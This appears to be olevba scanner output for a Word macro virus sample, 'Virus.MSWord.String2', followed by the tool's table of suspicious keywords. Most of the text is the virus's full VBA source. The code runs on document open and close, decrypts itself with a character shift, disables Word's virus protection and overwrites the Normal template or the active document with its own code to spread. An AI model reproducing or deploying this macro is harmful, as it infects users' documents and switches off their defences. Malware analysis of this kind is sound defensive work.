olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.String2-b52bac75c1700aae723fbb7d61ffff6176f99858
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.String2-b52bac75c1700aae723fbb7d61ffff6176f99858 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open(): On Error Resume Next
If Left(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(28, 1), 1) = "'" Then
For e = 28 To 44
rajt = Right(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(e, 1), (Len(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(e, 1)) - 1))
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline e, rajt
Next
For we = 28 To 44
naskod = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(we, 1)
For df = 1 To Len(naskod)
novi = novi & Chr(Asc(Mid(naskod, df)) - 7)
Next
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline we, novi
novi = ""
Next
string_boy
Else
For we = 28 To 44
naskod = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(we, 1)
For df = 1 To Len(naskod)
novi = novi & Chr(Asc(Mid(naskod, df)) + 7)
Next
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline we, Chr(39) & novi
novi = ""
Next
End If
End Sub
Private Sub string_boy()
Const nula = 0
Dim a, b, c, d: Set b = ThisDocument: Options.VirusProtection = nula
If b = ActiveDocument Then Set c = NormalTemplate Else Set c = ActiveDocument
d = b.VBProject.vbcomponents(1).codemodule.lines(1, _
b.VBProject.vbcomponents(1).codemodule.countoflines): a = Strings.LCase(d)
With c.VBProject.vbcomponents(1).codemodule
g = .lines(36, 1)
If g <> "'string_boy" Then
With c.VBProject.vbcomponents(1).codemodule
.deletelines 1, c.VBProject.vbcomponents(1).codemodule.countoflines
.insertlines 1, a
End With
End If
End With
If Day(Now()) = 7 Then
MsgBox "i'am alive!", vbCritical, "string_boy"
End If
End Sub
'string_boy
'10x to jackie for help on encryption
'greetz to all ppl on #virus and #vxtrader
'sp. greetz to bihnet.org and -=pu=-
Private Sub document_close()
document_open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

